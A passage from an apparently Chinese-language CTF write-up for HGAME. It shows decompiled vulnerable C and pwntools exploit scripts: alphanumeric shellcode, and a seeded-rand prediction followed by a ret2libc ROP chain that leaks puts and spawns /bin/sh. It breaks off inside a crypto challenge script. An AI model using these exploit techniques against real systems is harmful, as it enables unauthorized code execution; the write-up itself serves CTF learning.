class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>se<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote 51914aa91c52b27b3e1cc4bcec934fecfa3dff6c\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"elden-random-challenge100pt\"><a class=\"markdownIt-Anchor\" href=\"#elden-random-challenge100pt\">#</a> Elden Random Challenge(100pt)</h3>\n<blockquote>\n<p>rrrrraaaannnnndddddoooommmm</p>\n</blockquote>\n<p>随机数挑战，以 0 为种子去发送 99 次随机数即可</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> v4<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h] BYREF</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Eh] [rbp-12h] BYREF</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> v6<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> seed<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1Ch] [rbp-4h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span>argc<span class=\"token punctuation\">,</span> argv<span class=\"token punctuation\">,</span> envp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  seed <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Menlina: Well tarnished, tell me thy name.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x12uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"I see,%s\"</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Now the golden rule asks thee to guess ninety-nine random number. Shall we get started.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">98</span> <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    v6 <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">100</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    v4 <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Please guess the number:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v4<span class=\"token punctuation\">,</span> <span class=\"token number\">8uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> v6 <span class=\"token operator\">!=</span> v4 <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>      <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token operator\">++</span>i<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Here's a reward to thy brilliant mind.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token function\">myread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token class-name\">ssize_t</span> <span class=\"token function\">myread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">48</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-30h] BYREF</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0x100uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># r = remote('47.100.137.175',30918)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'/home/yhuan/Desktop/pwn_tools/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span> data         <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span> uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span> p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> length             <span class=\"token punctuation\">:</span> <span class=\"token string\">b'Yhuan'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">//</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">b'Y'</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>length <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Menlina: Well tarnished, tell me thy name.\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x12341234</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>srand <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>srand<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span> <span class=\"token comment\">#设置种子</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">99</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please guess the number:\\n'</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>rand<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">100</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>myread <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'myread'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x0000000000401423</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x000000000040101a</span>\t</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token number\">0x30</span><span class=\"token operator\">*</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>myread<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b\"Here's a reward to thy brilliant mind.\"</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>put_addr <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>put_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'put====>'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>put_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>libc <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">,</span>put_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>libc_base <span class=\"token operator\">=</span> put_addr <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'libc====>'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>system <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>binsh <span class=\"token operator\">=</span> libc_base <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'str_bin_sh'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>pl2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><blockquote R4nd0m\\_Th1ngs\\_4r3\\_pr3sen7s\\_1n\\_l1f3\\=\"\">\n<p>hgame\\</p>\n</blockquote>\n<h3 id=\"ezfmt-string100pt\"><a class=\"markdownIt-Anchor\" href=\"#ezfmt-string100pt\">#</a> ezfmt string(100pt)</h3>\n<blockquote>\n<p>easy Format String</p>\n</blockquote>\n<p>没做出来，学习 exp</p>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> CRYPTO</h2>\n<h3 id=\"奇怪的图片100pt\"><a class=\"markdownIt-Anchor\" href=\"#奇怪的图片100pt\">#</a> 奇怪的图片 (100pt)</h3>\n<blockquote>\n<p>一些奇怪的图片</p>\n</blockquote>\n<p>出题脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image<span class=\"token punctuation\">,</span> ImageDraw<span class=\"token punctuation\">,</span> ImageFont</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> secrets</pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"hgame&#123;fake_flag&#125;\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">generate_random_image</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">\"RGB\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"white\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    pixels <span class=\"token operator\">=</span> image<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>width<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>height<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            red <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            green <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            blue <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            pixels<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>red<span class=\"token punctuation\">,</span> green<span class=\"token punctuation\">,</span> blue<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> image</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">draw_text</span><span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    font_size <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    font <span class=\"token operator\">=</span> ImageFont<span class=\"token punctuation\">.</span>truetype<span class=\"token punctuation\">(</span><span class=\"token string\">\"arial.ttf\"</span><span class=\"token punctuation\">,</span> font_size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    text_color <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    x <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> width <span class=\"token operator\">-</span> font_size <span class=\"token operator\">*</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    y <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> height <span class=\"token operator\">-</span> font_size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    draw <span class=\"token operator\">=</span> 